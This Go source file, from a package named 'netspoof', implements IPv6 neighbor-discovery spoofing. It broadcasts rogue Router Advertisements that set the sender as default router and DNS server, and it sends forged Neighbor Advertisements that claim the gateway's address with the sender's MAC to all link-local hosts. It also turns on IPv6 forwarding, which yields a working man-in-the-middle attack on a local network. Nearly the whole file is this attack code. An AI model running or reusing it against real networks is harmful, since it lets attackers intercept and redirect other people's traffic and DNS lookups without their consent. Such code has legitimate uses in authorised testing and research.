package netspoof

import (
	"context"
	"fmt"
	"net"
	"net/netip"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/mdlayher/ndp"
)

// RunNDP sends Router Advertisements (SLAAC) and Neighbor Advertisements.
// It panics if the gateway IPv6 address cannot be auto-detected from the
// router flag in the IPv6 neighbor table.
func RunNDP(ctx context.Context, sess *Session) error {
	// Gateway IPv6 is auto-detected from the `router` flag in `ip -6 neigh`.
	var gwIPv6 netip.Addr
	deadline := time.Now().Add(5 * time.Second)
	for time.Now().Before(deadline) {
		// Force a fresh poll each iteration so we don't depend on discovery's
		// tick timing.
		refreshNeigh6(sess)
		if sess.GatewayIPv6.IsValid() {
			gwIPv6 = sess.GatewayIPv6
			break
		}
		time.Sleep(100 * time.Millisecond)
	}
	if !gwIPv6.IsValid() {
		panic("[ndp] gateway IPv6 not found: no `router` flag in `ip -6 neigh` after 5s")
	}
	fmt.Printf("[ndp] gateway IPv6 resolved: %s\n", gwIPv6)

	ourLL := sess.OurIPv6
	if !ourLL.IsValid() || !ourLL.IsLinkLocalUnicast() {
		panic("[ndp] no link-local IPv6 address on interface; cannot send RA/NA")
	}

	prevFwd := readIPv6Forward()
	writeIPv6Forward("1")
	ok := false
	for i := 0; i < 20; i++ {
		if readIPv6Forward() == "1" {
			ok = true
			break
		}
		time.Sleep(50 * time.Millisecond)
	}
	if !ok {
		return fmt.Errorf("[ndp] failed to enable net.ipv6.conf.all.forwarding")
	}
	fmt.Println("[ndp] ipv6 forwarding enabled")

	prevAccept := readAcceptRA(sess.IfaceName)
	writeAcceptRA(sess.IfaceName, "0")

	defer func() {
		fmt.Println("[ndp] shutting down, restoring IPv6 state")
		if c, _, err := ndp.Listen(sess.Iface, ndp.LinkLocal); err == nil {
			allNodes := netip.MustParseAddr("ff02::1")

			// 1) Withdraw router role: RouterLifetime = 0
			if ra := buildRA(sess, 0); ra != nil {
				_ = c.WriteTo(ra, nil, allNodes)
			}

			// 2) Deprecate the prefix so clients stop using it for new connections.
			//    Per RFC 4862 §5.5.3 we can't set ValidLifetime to 0 without the
			//    host ignoring the RA — so we set PreferredLifetime = 0 and keep
			//    ValidLifetime at the 2h minimum. The address stays valid but
			//    becomes Deprecated immediately.
			if ra := buildRADeprecate(sess); ra != nil {
				_ = c.WriteTo(ra, nil, allNodes)
			}

			// 3) Restore NA with the real MAC of the gateway we claimed.
			if realMAC, found := sess.Lan.Get(gwIPv6); found {
				na := &ndp.NeighborAdvertisement{
					Router:        true,
					Solicited:     false,
					Override:      true,
					TargetAddress: gwIPv6,
					Options: []ndp.Option{
						&ndp.LinkLayerAddress{Direction: ndp.Target, Addr: realMAC},
					},
				}
				_ = c.WriteTo(na, nil, allNodes)
			}

			time.Sleep(300 * time.Millisecond)
			c.Close()
		}
		writeIPv6Forward(prevFwd)
		writeAcceptRA(sess.IfaceName, prevAccept)
	}()

	c, _, err := ndp.Listen(sess.Iface, ndp.LinkLocal)
	if err != nil {
		return fmt.Errorf("[ndp] listen: %w", err)
	}
	defer c.Close()

	allNodes := netip.MustParseAddr("ff02::1")

	fmt.Printf("[ndp] started: our-ll=%s gw-ll=%s prefix=%s lifetime=%ds no-na=%v\n",
		ourLL, gwIPv6, sess.NDPPrefix, sess.NDPLifetime, sess.NDPNoNA)

	tick := time.NewTicker(1 * time.Second)
	defer tick.Stop()

	sendOnce := func() {
		if ra := buildRA(sess, uint16(sess.NDPLifetime)); ra != nil {
			if err := c.WriteTo(ra, nil, allNodes); err != nil {
				fmt.Printf("[ndp] RA send error: %v\n", err)
			}
		}

		if sess.NDPNoNA {
			return
		}

		targets := sess.NDPTargets
		if len(targets) == 0 {
			for ip := range sess.Lan.SnapshotV6() {
				if ip == ourLL || ip == gwIPv6 {
					continue
				}
				if !ip.IsLinkLocalUnicast() {
					continue
				}
				targets = append(targets, ip)
			}
		}

		for _, tgt := range targets {
			na := &ndp.NeighborAdvertisement{
				Router:        true,
				Solicited:     false,
				Override:      true,
				TargetAddress: gwIPv6,
				Options: []ndp.Option{
					&ndp.LinkLayerAddress{Direction: ndp.Target, Addr: sess.IfaceMAC},
				},
			}
			if err := c.WriteTo(na, nil, tgt); err != nil {
				fmt.Printf("[ndp] NA -> %s error: %v\n", tgt, err)
			}
		}
	}

	sendOnce()
	for {
		select {
		case <-ctx.Done():
			return nil
		case <-tick.C:
			sendOnce()
		}
	}
}

func buildRA(sess *Session, lifetime uint16) *ndp.RouterAdvertisement {
	managed := sess.DHCP6Active
	options := []ndp.Option{
		&ndp.RecursiveDNSServer{
			Lifetime: 300 * time.Second,
			Servers:  []netip.Addr{sess.OurIPv6},
		},
		&ndp.MTU{MTU: 1500},
	}

	// Only include prefix info when we're not telling clients to use DHCPv6.
	// With M=1, clients ask us for an address instead of using SLAAC.
	if !managed {
		prefix, err := netip.ParsePrefix(sess.NDPPrefix)
		if err != nil {
			fmt.Printf("[ndp] bad prefix %q: %v\n", sess.NDPPrefix, err)
			return nil
		}
		options = append([]ndp.Option{
			&ndp.PrefixInformation{
				PrefixLength:                   uint8(prefix.Bits()),
				OnLink:                         true,
				AutonomousAddressConfiguration: true,
				ValidLifetime:                  300 * time.Second,
				PreferredLifetime:              300 * time.Second,
				Prefix:                         prefix.Addr(),
			},
		}, options...)
	}

	return &ndp.RouterAdvertisement{
		CurrentHopLimit:      64,
		RouterLifetime:       time.Duration(lifetime) * time.Second,
		ManagedConfiguration: managed,
		OtherConfiguration:   managed,
		Options:              options,
	}
}

// buildRADeprecate builds an RA that withdraws our router role AND marks
// our advertised prefix as deprecated (PreferredLifetime = 0). This is the
// RFC-compliant way to signal "stop using this prefix for new connections".
func buildRADeprecate(sess *Session) *ndp.RouterAdvertisement {
	prefix, err := netip.ParsePrefix(sess.NDPPrefix)
	if err != nil {
		return nil
	}
	return &ndp.RouterAdvertisement{
		CurrentHopLimit:      64,
		RouterLifetime:       0, // stop being a router
		ManagedConfiguration: false,
		OtherConfiguration:   false,
		Options: []ndp.Option{
			&ndp.PrefixInformation{
				PrefixLength:                   uint8(prefix.Bits()),
				OnLink:                         true,
				AutonomousAddressConfiguration: true,
				// Preferred = 0  → address becomes Deprecated immediately
				PreferredLifetime: 0,
				// Valid = 2h     → satisfies RFC 4862 §5.5.3 so the RA is accepted
				ValidLifetime: 7200 * time.Second,
				Prefix:        prefix.Addr(),
			},
		},
	}
}

func readIPv6Forward() string {
	data, err := os.ReadFile("/proc/sys/net/ipv6/conf/all/forwarding")
	if err != nil {
		return "0"
	}
	return strings.TrimSpace(string(data))
}

func writeIPv6Forward(val string) {
	_ = exec.Command("sysctl", "-w", "net.ipv6.conf.all.forwarding="+val).Run()
}

func readAcceptRA(iface string) string {
	data, err := os.ReadFile("/proc/sys/net/ipv6/conf/" + iface + "/accept_ra")
	if err != nil {
		return "1"
	}
	return strings.TrimSpace(string(data))
}

func writeAcceptRA(iface, val string) {
	_ = exec.Command("sysctl", "-w", "net.ipv6.conf."+iface+".accept_ra="+val).Run()
}

var _ = net.IPv4len
